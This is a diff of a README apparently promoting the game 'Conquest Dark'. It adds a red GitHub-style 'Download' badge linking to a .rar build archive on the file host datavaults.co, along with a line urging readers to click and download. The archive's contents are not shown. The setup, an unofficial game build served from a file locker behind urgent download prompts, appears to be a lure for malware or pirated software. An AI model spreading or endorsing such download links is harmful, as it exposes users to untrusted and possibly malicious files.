@@ -63,6 +63,7 @@ Battle through cursed ruins, face undead legions, and uncover the secrets of **T
 ---  
 
 ## 🔻 **Download Now & Begin Your Ritual**  
-[![Download](https://datavaults.co/4ugweonwoyli/Conquest.Dark.Build.18338001.rar)  
 
-*"The Black Planet awaits... Will you rise or fall?"*  
+[![Download](https://img.shields.io/badge/Download-Conquest_Dark-red?style=for-the-badge&logo=github)](https://datavaults.co/4ugweonwoyli/Conquest.Dark.Build.18338001.rar)  
+**🔥 Click the buttons above to download & join our community!**  
+ 
